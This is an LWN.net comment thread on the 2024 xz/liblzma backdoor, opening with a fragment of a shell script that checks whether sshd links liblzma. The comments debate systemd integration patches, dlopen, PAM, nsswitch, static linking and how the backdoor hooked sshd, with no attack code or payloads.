> # find path to liblzma used by sshd

> path="$(ldd $(which sshd) | grep liblzma | grep -o '/[^ ]\*')"

> # does it even exist?

> if [ "$path" == "" ]

> then

> echo probably not vulnerable

> exit

> fi

[...]

$(which sshd) returns "" IF not run as root...

In this case the message should be "Cannot find 'sshd'" and not be a "probably not vulnerable"

### A backdoor in xz

Posted Mar 29, 2024 19:39 UTC (Fri)
by **kleptog** (subscriber, #1183)
[[Link](/Articles/967215/)]

What you're looking at there \*is\* the injected shell code. I think you see it because as an artifact of the LWN archive.

If you look at the Openwall archive (<https://www.openwall.com/lists/oss-security/2024/03/29/4>) you'll see the first attachment is the injected code you see above, the second is a binary attachment and the actual detection script is the third, but doesn't appear in the LWN copy of the email.

### A backdoor in xz

Posted Mar 29, 2024 19:42 UTC (Fri)
by **bkw1a** (subscriber, #4101)
[[Link](/Articles/967212/)] (126 responses)

The post from Andres Freund says:

"openssh does not directly use liblzma. However debian and several other distributions patch openssh to support systemd notification, and libsystemd does depend on lzma."

It seems to me that distributions shouldn't be modifying a critical piece of security infrastructure like sshd. Isn't that just asking for trouble?

### A backdoor in xz

Posted Mar 29, 2024 20:01 UTC (Fri)
by **cjwatson** (subscriber, #7322)
[[Link](/Articles/967222/)] (80 responses)

It's pretty difficult to get systemd integration right without patching sshd. Upstream are BSD folks and very firmly Don't Care About Systemd; there's no hope of getting that patch upstream.

That said, it's rather tempting to amend that patch to talk to NOTIFY\_SOCKET directly rather than by linking against libsystemd, just to reduce exposure to gadgets like this.

### A backdoor in xz

Posted Mar 29, 2024 20:10 UTC (Fri)
by **cjwatson** (subscriber, #7322)
[[Link](/Articles/967227/)] (18 responses)

The only problem is that it's a pretty horrible amount of code to have to inline. Look at pid\_notify\_with\_fds\_internal ...

Apparently unreleased versions of systemd dlopen liblzma instead, which would have meant it wasn't in sshd's process space.

### A backdoor in xz

Posted Mar 29, 2024 20:28 UTC (Fri)
by **intelfx** (subscriber, #130118)
[[Link](/Articles/967231/)] (3 responses)

> The only problem is that it's a pretty horrible amount of code to have to inline. Look at pid\_notify\_with\_fds\_internal

I don't think any of that code is needed. OpenSSH as patched only needs sd\_listen\_fds() and plain sd\_notify() which \_as used\_ can be implemented in about 5-10 lines of C code each.

### A backdoor in xz

Posted Mar 29, 2024 20:35 UTC (Fri)
by **cjwatson** (subscriber, #7322)
[[Link](/Articles/967237/)] (2 responses)

sd\_notify calls pid\_notify\_with\_fds\_internal, though? But if there's a reasonably standard inlined C reimplementation that covers all the necessary API surface, I'd definitely consider it.

### A backdoor in xz

Posted Mar 30, 2024 1:12 UTC (Sat)
by **zdzichu** (subscriber, #17118)
[[Link](/Articles/967305/)]

That's the details of a specific implementation. Actual protocol is simple. Env var contains a socket path, you write a short string text string to it. Really few lines of code.

### A backdoor in xz

Posted Mar 30, 2024 6:50 UTC (Sat)
by **intelfx** (subscriber, #130118)
[[Link](/Articles/967339/)]

> But if there's a reasonably standard inlined C reimplementation that covers all the necessary API surface, I'd definitely consider it.

Yep, that's why I tried to emphasize "as used". The implementation you see is shared between several mostly-disjoint users (e. g. it is also used to communicate with hypervisors via vsock) and also implements other features of this ad-hoc protocol (such as fd passing) which are not used in openssh.

The usage in openssh (to signal readiness) is covered by writing a fixed, static text string into an AF\_UNIX datagram socket pointed to by the $NOTIFY\_SOCKET variable.

### A backdoor in xz

Posted Mar 29, 2024 21:05 UTC (Fri)
by **judas\_iscariote** (guest, #47386)
[[Link](/Articles/967246/)] (13 responses)

It will still be.. selinux requires it. happy now ? Supply chain attacks are not systemd's fault .. :-)

It is more like corporations fault for not paying people to work in things they profit from.

### A backdoor in xz

Posted Mar 30, 2024 11:04 UTC (Sat)
by **fenncruz** (subscriber, #81417)
[[Link](/Articles/967395/)] (12 responses)

I agree it's not systemd's fault, but is there something it (and other software) can do to make this attack harder? Like somehow preventing the symbols being replaced by a malicious library?

### A backdoor in xz

Posted Mar 30, 2024 12:02 UTC (Sat)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967399/)] (7 responses)

We have already replaced all linked dependencies (apart from glibc and libcap) in libsystemd.so with dlopen (that is activated only if and when the specific API that needs the external library is called, not automatically) in git main

### A backdoor in xz

Posted Mar 30, 2024 14:12 UTC (Sat)
by **smurf** (subscriber, #17840)
[[Link](/Articles/967425/)]

Interesting. I was about to thank you for your proactive response to this incident, but a look at systemd's git reveals that this change was done a month ago, in order to reduce systemd's footprint on startup RAM disks. ;-)

### A backdoor in xz

Posted Mar 30, 2024 15:27 UTC (Sat)
by **dskoll** (subscriber, #1630)
[[Link](/Articles/967467/)] (1 responses)

I understand the advantages of the dlopen approach, but it still leaves me feeling uneasy. You might get shared libraries that you don't expect dlopened just by making an innocent API call.

It seems to me that the supervisor notification protocol is likely to be used by many programs, and also quite likely that they might not want anything else from libsystemd. Wouldn't it make sense to put the notification client code in its own shared library that has no external dependencies and won't dlopen anything else ever?

### A backdoor in xz

Posted Mar 30, 2024 15:52 UTC (Sat)
by **zdzichu** (subscriber, #17118)
[[Link](/Articles/967469/)]

Funny, it was this way until v209 in 2014. sd-daemon was a collection of functions like sd\_notify() and so on, it got merged into libsystemd then.

### A backdoor in xz

Posted Mar 30, 2024 18:36 UTC (Sat)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967508/)] (3 responses)

Sorry, but random dlopen()s are even MORE unacceptable. It also prevents very useful security measures like locking the text of the running executable.

### A backdoor in xz

Posted Mar 30, 2024 19:14 UTC (Sat)
by **andresfreund** (subscriber, #69562)
[[Link](/Articles/967521/)] (2 responses)

It doesn't prevent that at all? Unless you use text relocations, .text should only be mapped read only. And .got would have been remapped ro at start if you use -z now -z relro. Dlopen() doesn't change any of that?

### A backdoor in xz

Posted Mar 30, 2024 19:41 UTC (Sat)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967529/)] (1 responses)

I mean, locking down the complete set of executable pages in a process, so that no new code can't get loaded. OpenBSD has mseal() that can do that.

> Dlopen() doesn't change any of that?

Indeed it doesn't (right now), but expanding its usage will make it harder to enable something like mseal() later.

### A backdoor in xz

Posted Mar 31, 2024 13:13 UTC (Sun)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967671/)]

You can still do that, but then you lose some features. That seems like a perfectly acceptable trade-off to me.

### A backdoor in xz

Posted Mar 30, 2024 16:53 UTC (Sat)
by **judas\_iscariote** (guest, #47386)
[[Link](/Articles/967480/)] (3 responses)

Yes, you can prevent symbols from been replaced by something else by various compiler, linker flags and possibly enviroment variables.. it will still be a cat & mouse game because something that has root already has all the power.

### A backdoor in xz

Posted Mar 30, 2024 19:05 UTC (Sat)
by **andresfreund** (subscriber, #69562)
[[Link](/Articles/967517/)] (1 responses)

Afaict all the options for doing so were used in this case. The redirection happened just before the got was remapped read only.

I'm somewhat surprised that nobody called for glibc's rtld-audit infrastructure to be removed. That's really what made this attack possible despite relro. As far as I know, it's not used widely.

### A backdoor in xz

Posted Mar 31, 2024 13:30 UTC (Sun)
by **nix** (subscriber, #2304)
[[Link](/Articles/967677/)]

Perhaps it should be possible to set some sort of link-time tag to instruct ld.so to disable the LD\_AUDIT infrastructure for particular binaries? Not sure that's doable for specific shared libraries, but at least this would let one mark critical system daemons as "hands-off" for this application, so their own libraries can't compromise them like this. It's enough like AT\_SECURE or coredump/ptrace prevention that there should probably be one mechanism to turn all this stuff on at the same time... (For userspace stuff latrace and the things that it enables are actually quite useful, but I can't imagine ever running latrace on sshd, and if I did I'm debugging it anyway and would be at the very least foregrounding it and could presumably manually turn auditing back on. For that matter, latrace could be modified to do that to the programs it invokes, since it knows its own use of LD\_AUDIT is non-malicious.)

### A backdoor in xz

Posted Mar 31, 2024 6:37 UTC (Sun)
by **epa** (subscriber, #39769)
[[Link](/Articles/967635/)]

I think if the symbol-replacing were not allowed, nor arbitrary code execution on \*loading\* the library, then the attack would be more difficult. The application does not call any functions from xz. An attacker would have to get a backdoor into the library and somehow persuade sshd to call it.

### A backdoor in xz

Posted Mar 29, 2024 20:15 UTC (Fri)
by **bkw1a** (subscriber, #4101)
[[Link](/Articles/967228/)] (4 responses)

Every time a patch pulls in a new dependency, it increases our attack surface. That needs to be weighed against the benefit of the patch. For something like sshd, it seems like the openssh developers, who have security as their primary focus, should be the ones we trust to make that decision.

### A backdoor in xz

Posted Mar 29, 2024 20:23 UTC (Fri)
by **cjwatson** (subscriber, #7322)
[[Link](/Articles/967232/)] (2 responses)

I mean, look, I defer to the openssh developers on a \_lot\_ of stuff, but they're not the ones trying to integrate with the rest of our distribution and that does sometimes force some different decisions. The best I can do is document all the deviations as clearly as possible.

### A backdoor in xz

Posted Mar 29, 2024 22:02 UTC (Fri)
by **dilinger** (subscriber, #2867)
[[Link](/Articles/967259/)] (1 responses)

Also, what \*is\* "critical security infrastructure"? Is firefox/chromium critical security infrastructure? Is glibc? libz? libsasl? libselinux? Systemd does a whole lot of critical things on my system; is that critical security infrastructure that we shouldn't be patching?

On a lot of desktops, sshd isn't even installed. Is it critical security infrastructure because it's installed on some servers you consider important? What about the other daemons installed on important servers, like nginx/apache (and often the whole lamp stack)?

If you actually look at attack vectors, you start realizing pretty quickly that A LOT of software could (or should) be considered critical security infrastructure, and it's pretty unrealistic to not have to patch all of those bits of software to work on Debian's many desktop/server environments and hardware architectures. That also assumes that we can trust upstreams to not backdoor their code, which, as this example shows us, we clearly cannot.

### A backdoor in xz

Posted Apr 3, 2024 5:44 UTC (Wed)
by **Lennie** (subscriber, #49641)
[[Link](/Articles/968110/)]

The funny part is: any software installed becomes critical security infrastructure if a FOSS developer develops the software on his primary laptop which holds the SSH-keys used for git commits singing and git push.

### A backdoor in xz

Posted Mar 29, 2024 23:58 UTC (Fri)
by **mcatanzaro** (subscriber, #93033)
[[Link](/Articles/967287/)]

Sounds good, but in this case I think that's just wrong. You really want systemd to accurately know whether sshd is running or not. If systemd doesn't know, then you don't know, and that's a security disaster.

### A backdoor in xz

Posted Mar 29, 2024 23:38 UTC (Fri)
by **cjwatson** (subscriber, #7322)
[[Link](/Articles/967282/)]

I guess I need to amend this since <https://bugzilla.mindrot.org/show_bug.cgi?id=2641#c13> happened. If something like that gets in then we'll definitely adopt it in Debian.

### A backdoor in xz

Posted Mar 30, 2024 1:11 UTC (Sat)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967306/)] (48 responses)

Why does my ssh server need to integrate with my service manager?

### A backdoor in xz

Posted Mar 30, 2024 1:40 UTC (Sat)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967312/)] (47 responses)

Because the service manager needs to know when the ssh server is ready

### A backdoor in xz

Posted Mar 30, 2024 5:30 UTC (Sat)
by **wtarreau** (subscriber, #51152)
[[Link](/Articles/967333/)] (11 responses)

Why ? Your response sounds more like "wants to know".

### A backdoor in xz

Posted Mar 30, 2024 5:48 UTC (Sat)
by **rra** (subscriber, #99804)
[[Link](/Articles/967334/)] (10 responses)

So that the system administrator who just restarted the ssh server knows it didn't actually start and doesn't log out before fixing it.

So that other services that depend on the ssh server being started know when to start.

So that when you ask the service manager what services failed, you'll know that the ssh server failed.

So that you have an actual service manager, not a bunch of YOLO shell scripts with no error handling.

### A backdoor in xz

Posted Mar 30, 2024 8:12 UTC (Sat)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967360/)] (9 responses)

If it didn't actually start, then it shouldn't have forked off and backgrounded itself, which is how services notified the service manager that they had successfully started for literal decades before systemd came along.

### A backdoor in xz

Posted Mar 30, 2024 8:23 UTC (Sat)
by **mb** (subscriber, #50428)
[[Link](/Articles/967365/)] (4 responses)

Yep, and it was broken all the time because everybody did it differently and slightly wrong, until systemd came along.

But let's not distract from the discussion: systemd ist \*not\* why this backdoor was possible. It could have been any other library. It could even have been any other server application. It's not restricted to sshd.

The real problem is that patches that have not been understood/reviewed have been applied.

This is a social problem. Not a technical one.

### A backdoor in xz

Posted Mar 30, 2024 12:46 UTC (Sat)
by **stef70** (guest, #14813)
[[Link](/Articles/967405/)] (1 responses)

Indeed. We need to wait until the full analysis of the backdoor to be sure that no tool other than sshd was targeted.

On my Debian system, liblzma.so is linked in several programs and libraries. A lot are unrelated to systemd: grub, insmod, lvm, reboot, gimp, imagemagick, runlevel, ...

All of them are potential targets for that xz backdoor. For now, we have to wait for the full analysis. I am pretty optimistic that sshd was the main target because installing another backdoor on the system or calling "home" would significantly increase the probability or detection.

### A backdoor in xz

Posted Mar 30, 2024 23:33 UTC (Sat)
by **brooksmoses** (guest, #88422)
[[Link](/Articles/967565/)]

There is code in the exploit that would look for additional files in the "test" directory that matched specific byte patterns, and then extract a payload from them and execute it. There are currently no files matching those patterns -- so it certainly looks like this bit was designed as a capability to target additional programs simply by adding additional "test" files to the git repository.

[Reference: [https://github.com/Midar/xz-backdoor-documentation/wiki#s...](https://github.com/Midar/xz-backdoor-documentation/wiki#stage-2) as of the time of this comment.]

### A backdoor in xz

Posted Mar 31, 2024 1:25 UTC (Sun)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967589/)] (1 responses)

> Yep, and it was broken all the time because everybody did it differently and slightly wrong, until systemd came along.

Ah, okay. And how exactly do you believe that one methods of notifications is any more reliable at this than any other? They all rely on the software developer picking a good time to say "started".

> But let's not distract from the discussion: systemd ist \*not\* why this backdoor was possible

It absolutely is.

> It could have been any other library

But it wasn't. "Don't worry about our vulnerabilities, other people have vulnerabilities too!" "Don't worry about our bad design, other people have bad design too!"

### A backdoor in xz

Posted Mar 31, 2024 9:22 UTC (Sun)
by **smurf** (subscriber, #17840)
[[Link](/Articles/967644/)]

> They all rely on the software developer picking a good time to say "started".

They all rely on picking a good time that happens to \*work\*.

There are plenty of situations where, once you're \*really\* started, it's no longer possible to signal "OK I'm alive now" by double-forking.

Writing a PID file has its own class of race conditions, the handling of which I can guarantee most users of that method get fatally wrong.

And so on.

> "Don't worry about our vulnerabilities, other people have vulnerabilities too!" "Don't worry about our bad design, other people have bad design too!"

Don't blame the messenger. If linking to a library you don't strictly need \*in your particular situation\* is a "vulnerability" or "bad design" I can guarantee that 90+% of programs out there suffer from it.

### A backdoor in xz

Posted Mar 30, 2024 9:53 UTC (Sat)
by **motk** (subscriber, #51120)
[[Link](/Articles/967381/)]

Yeah, and it sucked. It sucked 35 years ago. It still sucks.

This whole thing has nothing to do with service management, and everything to do with large corporations relying on volunteers writing critical software apparently just for something to do.

### A backdoor in xz

Posted Mar 30, 2024 16:58 UTC (Sat)
by **rra** (subscriber, #99804)
[[Link](/Articles/967475/)] (2 responses)

> If it didn't actually start, then it shouldn't have forked off and backgrounded itself, which is how services notified the service manager that they had successfully started for literal decades before systemd came along.

I have run UNIX systems throughout those literal decades that you are talking about, and your faith in this half-assed, failure-prone mechanism is badly misplaced. I cannot count the number of ways I have seen this fail: the process does not actually start listening to the network until after the fork, the process starts listening before the fork but isn't really ready to accept connections because there is setup that has to be done after the fork, the process forks but doesn't fork twice and thus isn't properly reparented, the process didn't write a PID file and now you have no idea which process is actually running the service, the process did write a PID file and wrote the wrong PID to that file, you end up with multiple backgrounded copies of the same service running and interfering weirdly with each other... the list goes on.

We figured out that this was a bad way to run services by at least the early 2000s, when support for a foreground model with none of this self-daemonization nonsense badly copied into every service became widely available (and as someone who was managing UNIX systems all through that period, that was a delightful revelation). But you do not want to assume that the service is ready simply because the process has started. You need some mechanism for signaling that the service really has fully started, has allocated all of its resources, and is listening to network connections (if that is its job). Otherwise, you risk starting services that depend on it too soon.

Even upstart (the alternative preferred by some of the folks who disliked systemd) had a mechanism for doing this. (It was worse than systemd's, at least in my opinion.)

### A backdoor in xz

Posted Mar 31, 2024 1:25 UTC (Sun)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967590/)] (1 responses)

So have I, and YOUR faith in systemd's half-assed, failure-prone mechanism is badly misplaced.

### Please stop here

Posted Mar 31, 2024 1:45 UTC (Sun)
by **corbet** (editor, #1)
[[Link](/Articles/967601/)]

We have managed to keep this conversation relatively free of systemd bashing, which is really not relevant to the discussion. Please don't do any more of it here.

### A backdoor in xz

Posted Mar 30, 2024 7:09 UTC (Sat)
by **epa** (subscriber, #39769)
[[Link](/Articles/967344/)] (34 responses)

Fair enough. But why does that functionality need to pull in xz support? The ssh daemon does not itself do xz compression in order to integrate with systemd.

If the answer is “because it links as a C library and you get the transitive dependencies of everything”, that’s something to improve.

### A backdoor in xz

Posted Mar 30, 2024 7:32 UTC (Sat)
by **mb** (subscriber, #50428)
[[Link](/Articles/967350/)] (1 responses)

>because it links as a C library and you get the transitive dependencies of everything

So, statically link with LTO?

### A backdoor in xz

Posted Mar 31, 2024 14:23 UTC (Sun)
by **dskoll** (subscriber, #1630)
[[Link](/Articles/967685/)]

No, static linking isn't needed. Just split the large libsystemd into smaller libraries where each smaller library contains a set of closely-related APIs and minimal other dependencies. There's no reason to pull code in to do log compression if all you need is code for the sd\_notify protocol.

### A backdoor in xz

Posted Mar 30, 2024 7:50 UTC (Sat)
by **cjwatson** (subscriber, #7322)
[[Link](/Articles/967353/)] (31 responses)

Indeed, and apparently unreleased versions of systemd already trim down the linkage of libsystemd so that liblzma won't be in the process space unless it's actually needed.

### A backdoor in xz

Posted Mar 30, 2024 10:24 UTC (Sat)
by **job** (guest, #670)
[[Link](/Articles/967385/)] (30 responses)

Doesn't that obscure what is happening, which risks making a not good situation even worse? The situation with a backdoored library would still be there, just harder to diagnose.

### A backdoor in xz

Posted Mar 30, 2024 12:07 UTC (Sat)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967400/)] (25 responses)

The impact is reduced, because dlopen only happens if and when the API using the library is called by the program linking to libsystemd, rather than by default. So in this case it would not have happened, because sshd does not read compressed journal files, which is the reason compressed libs are linked in libsystemd.

Dependency chain of a full-feature build of libsystemd from main (plus a PR under review):

build/libsystemd.so.0 (interpreter => None)

libcap.so.2 => /lib/x86\_64-linux-gnu/libcap.so.2

libc.so.6 => /lib/x86\_64-linux-gnu/libc.so.6

ld-linux-x86-64.so.2 => /lib/x86\_64-linux-gnu/ld-linux-x86-64.so.2

We want to remove the need for libcap too, but that's a bit more complex.

### A backdoor in xz

Posted Mar 30, 2024 18:23 UTC (Sat)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967503/)] (24 responses)

This is an EXTREMELY bad move from systemd. A dlopen() is a much more worrying signal of exploitation, because it's so unused. And libsystemd will make it normal.

It also won't close off all avenues of attack. A malicious library can patch the code, ptrace() its process, modify the environment, etc.

### A backdoor in xz

Posted Mar 30, 2024 19:12 UTC (Sat)
by **andresfreund** (subscriber, #69562)
[[Link](/Articles/967520/)] (16 responses)

There already are dlopens in things like sshd, via e.g. PAM.

### A backdoor in xz

Posted Mar 30, 2024 19:36 UTC (Sat)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967528/)] (14 responses)

Yeah, and I also forgot about the horror of nsswitch.

Still, we should start cutting back on this kind of nonsense.

### A backdoor in xz

Posted Mar 31, 2024 13:46 UTC (Sun)
by **nix** (subscriber, #2304)
[[Link](/Articles/967678/)] (13 responses)

So to you, dlopen is a signal of exploitation and should be avoided because it's so rare, until it is pointed out that it's not rare and is already used in a wide variety of processes, whereupon you switch to calling unclear things 'this kind of nonsense', cite nsswitch (which is not relevant, given that PAM is at issue here), and suggest, what? Removing PAM and nsswitch?

That's going to work really well given how many sites use both to fold in new hostname lookup mechanisms, new user lookup mechanisms, and new and fairly complex authentication patterns on the fly.

Anyway, dropping nsswitch and PAM wouldn't even really help, despite being immensely disruptive. dlopen does have its problems[1] and it is reasonable to prefer to avoid it when possible, but it is not rare even in the absence of nsswitch and PAM. Try adding reporting to glibc to see how often it's invoked on real running systems. (It's a \*lot\*. Even syslog daemons make extensive use of it these days, so you can't even say "perhaps daemons running as root can't dlopen".)

You cannot use 'this uses dlopen' as a signal of suspiciousness, or of anything really, any more than 'this is dynamically linked' is such a signal. "This has IFUNC resolvers that redirect symbols in other libraries" is definitely an actual sign of badness that I've never heard of anything legitimate doing, and I'm wondering if glibc could detect and block that somehow without too much cost (it would at least involve stack frame walks, but the resolver has to mess with the stack frame anyway...)

[1] now that prelink is dead, mostly that you can't use ldd to statically determine what the shared library dep tree is and what things might be potentially impacted by ABI changes, which \*is\* actually problematic on real systems

### A backdoor in xz

Posted Mar 31, 2024 16:12 UTC (Sun)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967695/)] (12 responses)

> So to you, dlopen is a signal of exploitation and should be avoided because it's so rare, until it is pointed out that it's not rare and is already used in a wide variety of processes, whereupon you switch to calling unclear things 'this kind of nonsense', cite nsswitch (which is not relevant, given that PAM is at issue here), and suggest, what? Removing PAM and nsswitch?

Yeah, exactly. Remove dlopen() calls by refactoring the relevant systems. For example, musl libc does not have nsswitch (and has a built-in NSCD). PAM is already optional.

### A backdoor in xz

Posted Mar 31, 2024 17:02 UTC (Sun)
by **nix** (subscriber, #2304)
[[Link](/Articles/967701/)] (11 responses)

So... that this wouldn't actually help solve this problem is not important to you, then? (You clipped that out of my original reply without comment.)

That's a sign of someone on a hobby-horse if I ever heard of one.

(As someone who needs PAM to even log on -- on account of wanting to use YubiKey OTP to do so -- and who uses nsswitch for a variety of homebrewed lookups, I would obviously not be willing to drop either.)

### A backdoor in xz

Posted Apr 1, 2024 12:19 UTC (Mon)
by **foom** (subscriber, #14868)
[[Link](/Articles/967783/)] (10 responses)

Nsswitch has an obvious replacement for dlopen: sockets. They're already used in many interesting scenarios, e.g. host lookup is via DNS to localhost, user database often comes from libnss\_ldapd or sssd — both of which simply implement a private socket protocol in their nsswitch library to talk to their corresponding service on localhost.

Then of course there's nscd, as already mentioned: a socket protocol for nsswitch lookups already implemented by glibc and musl. Someone could implement a different nscd server-side which doesn't use dlopen — without even modifying glibc. Yet, as far as I know, nobody actually has done so.

On the PAM side there's no similarly easy replacement, though one could investigate OpenBSD's BSD Auth system, which is extensible via spawning subprocesses to handle auth tasks.

In any case, that nobody seems to actually be working on any of this probably shows just how unimportant avoiding dlopen is for most people...

### A backdoor in xz

Posted Apr 1, 2024 16:48 UTC (Mon)
by **nix** (subscriber, #2304)
[[Link](/Articles/967878/)] (9 responses)

Avoiding the need to dlopen in statically linked binaries, while not losing nsswitch for such binaries, actually \*does\* matter to upstream (it would simplify ld.so a whole hell of a lot). So switching to a socket-based protocol is definitely on the cards.

The problem, as ever, is doing that compatibly -- but I suppose if glibc itself provided the 'nss server' that loaded existing nss modules and did everything else nsswitch did, and glibc called into it using the sort of thing you describe, this sort of thing might be practical: it would probably make nscd less of a horror show, too. With a lot of work (how many nss modules depend on being in the same address space as the running process, for starters? I bet it's not zero. And I bet this would slaughter performance for simpler cases, so maybe nss\_files still needs to be built in. And so forth...)

### A backdoor in xz

Posted Apr 1, 2024 18:04 UTC (Mon)
by **foom** (subscriber, #14868)
[[Link](/Articles/967884/)] (1 responses)

An "nss server" is literally what nscd \_already is\_!

If you run the nscd service, then glibc sends nss lookups to nscd over a socket, instead of running them inside other binaries.

Nscd comes with a caching layer (unsurprisingly given its name), but you can mostly disable that if you only want the nss-server functionality.

### A backdoor in xz

Posted Apr 2, 2024 17:10 UTC (Tue)
by **nix** (subscriber, #2304)
[[Link](/Articles/967994/)]

Oh, of course it is. I am clearly missing the obvious right now :(

### A backdoor in xz

Posted Apr 1, 2024 18:23 UTC (Mon)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967886/)] (6 responses)

> Avoiding the need to dlopen in statically linked binaries, while not losing nsswitch for such binaries, actually \*does\* matter to upstream (it would simplify ld.so a whole hell of a lot). So switching to a socket-based protocol is definitely on the cards.

glibc is the worst library in existence, so no wonder.

On the other hand, musl libc simply uses the nscd protocol to provide the NSS functionality and even allows wrapping legacy NSS modules: <https://github.com/pikhq/musl-nscd>

Additionally, with musl I can \_already\_ get a fully static system with zero dlopen()s or dynamic libraries. There are even several experimental distros that are fully statically linked. E.g.: <https://framagit.org/Ypnose/solyste>

### A backdoor in xz

Posted Apr 2, 2024 17:12 UTC (Tue)
by **nix** (subscriber, #2304)
[[Link](/Articles/967995/)] (5 responses)

> glibc is the worst library in existence, so no wonder.

At this point I'm wondering if you're just being intentionally unpleasant. glibc navigates a frankly horrifying pile of tradeoffs and does the job fairly well given that. If it was "the worst library in existence" it would not be \*remotely\* so widely used, nor work as well as it does.

### A backdoor in xz

Posted Apr 2, 2024 22:54 UTC (Tue)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/968077/)] (4 responses)

I've been holding this opinion about glibc for decades now. I understand the difficulty of developing glibc, and it excuses at least some warts. But then we have musl which is so much nicer, while being standards-compliant.

I believe we should take at least \_some\_ of that experience and apply it to the rest of the system. Being static-friendly and not dlopen()-ing stuff is definitely a part of that.

BTW, does dlopen() in libsystemd preclude its static linking?

### A backdoor in xz

Posted Apr 3, 2024 11:17 UTC (Wed)
by **nix** (subscriber, #2304)
[[Link](/Articles/968164/)] (3 responses)

> BTW, does dlopen() in libsystemd preclude its static linking?

In the future in glibc, yes. In all other libcs I'm aware of, yes, even now. (Or, rather, you can \*try\* to call it in statically-linked binaries, but the call will always fail.)

This is of course one of many reasons why just statically linking everything is not the panacea some seem to think -- plugins really \*are\* a thing and sometimes loadable shared code in the same address space is a convenient way to implement them... there's not a chance you'll ever get KDE to work statically linked, for instance.

### A backdoor in xz

Posted Apr 3, 2024 16:30 UTC (Wed)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/968290/)] (2 responses)

> This is of course one of many reasons why just statically linking everything is not the panacea some seem to think -- plugins really \*are\* a thing

Plugins are a thing that has no business being in the foundational parts of the runtime. And it's not like we don't have a real-world example of a system without them, Alpine Linux exists. And it's significantly nicer to work with than the glibc-based systems.

### A backdoor in xz

Posted Apr 4, 2024 12:49 UTC (Thu)
by **nix** (subscriber, #2304)
[[Link](/Articles/968373/)] (1 responses)

> Plugins are a thing that has no business being in the foundational parts of the runtime.

I am not convinced, and since as usual you didn't bother to give any reasons, relying instead on pure assertion, I'm not sure why you think this not-an-argument would ever convince anyone who didn't already agree with you.

Why on earth would you consider name lookup or authentication, both things that have had numerous wildly divergent implementations over time and which obviously have different site-by-site requirements, hence the \*existence\* of pluggable systems to implement them, to be things that "have no business" existing, based on the pure assertion that they are "in the foundational parts of the runtime"? People are \*using\* nss and PAM's extensibility, you know. They're not just there to annoy you. This is not a moribund module system with a half-dozen stale modules that have hardly changed in the last twenty years. People are plugging other things into that pluggability. (Not that this attack even \*relied\* on that pluggability, or NSS, or PAM, so why you think ripping them out will help here is quite beyond me.)

For that matter, what on earth even is a "foundational part of the runtime"? Is it the toolchain? Surely that counts if anything does! Better rip out LTO from GCC and clang then, since both rely on linker plugins that run the entire compiler! (Also, how many linker plugins are there? I can hardly name any but LTO. That's gotta be moribund, rip it out!) Is it the kernel? Better rip out kernel modules then, in-tree or not, since if they're not dynamically loaded plugins, nothing is... is it glibc? Surely not, since you can replace it with any other libc you like and keep the kernel and most userspace the same after a recompile: it could hardly be foundational! So I guess NSS can stay. Not sure about PAM, the idea came from Solaris and you have in the past expressed a liking for that sort of thing so maybe that's good now too?

That's the problem with arguing by pure assertion: since you give no reasons, define none of your terms, and provide no grounds to agree with you, there's no reason to accept your premises: and even if I do, it's easy to argue in the exact opposite direction since the premises are so vague, which makes your argument nothing more than a statement of personal preferences and an assertion that of course \*your\* personal preferences are more important than anyone else's.

Is the real definition "something Cyberax asserts without argument or rationale is foundational"? Or just "Cyberax is right"?

### A backdoor in xz

Posted Apr 4, 2024 17:24 UTC (Thu)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/968437/)]

I thought that the reasons for NOT doing plugins are obvious. They add a huge amount of complexity, preclude useful mitigations (mseal/mimmutable), and make the system harder to analyze. You can't statically determine the dependency closure anymore.

Plugins inherently face a complicated environment that they don't control and should not perturb too much. And a crashed plugin will take down the entire application. This was reasonable 30 years ago, but it's not anymore. These days, we actually have a good architectural pattern for this: split modules into a separate daemon that is activated by systemd as needed.

> People are \*using\* nss and PAM's extensibility, you know.

NSS is actually hardly used these days, NIS/NIS+ have mostly died out. The only major surviving service is LDAP (usually via SSSD). It can simply be incorporated into the glibc (it's 43kb), or it can be split into a daemon that talks to glibc via the NSCD protocol.

If we're talking about PAM in particular, then it's nothing but a stack of bad design decisions. In case of SSH, they can be replaced by ephemeral SSH certificates for most of the scenarios (e.g. a shared machine in a university or for management access to the production cluster on AWS EC2).

These two items will make most non-interactive systems completely dlopen()-free.

### A backdoor in xz

Posted Apr 1, 2024 14:41 UTC (Mon)
by **job** (guest, #670)
[[Link](/Articles/967858/)]

In retrospect, I think most people would agree that the design of PAM was a mistake. It was hugely controversial at its time and many fought against its inclusion in distributions.

In the end it was included because it made possible some use cases where no one else stepped up to make a practical alternative.

I don't think that is something we want to emulate. It is certainly possible to satisfy the necessary use cases without resorting to dlopen().

### A backdoor in xz

Posted Mar 31, 2024 12:12 UTC (Sun)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967660/)] (6 responses)

The main reason this is done and will happen is to reduce mandatory dependencies. If the Linux ELF format supported optional dependencies in a better way, that are loaded only when needed, then there wouldn't be any need for manually doing dlopen(). I believe OSX's shared object format implements this. But we are where we are, and hence that's the only mechanism we got.

### A backdoor in xz

Posted Mar 31, 2024 13:49 UTC (Sun)
by **nix** (subscriber, #2304)
[[Link](/Articles/967679/)]

Hmm. That's interesting! This is kind of a DT\_NEEDED which kicks in (and loads dependent libs, runs constructors etc) only when the first symbol in it is called, kind of like lazy binding but doing a lot more than just a symbol resolution?

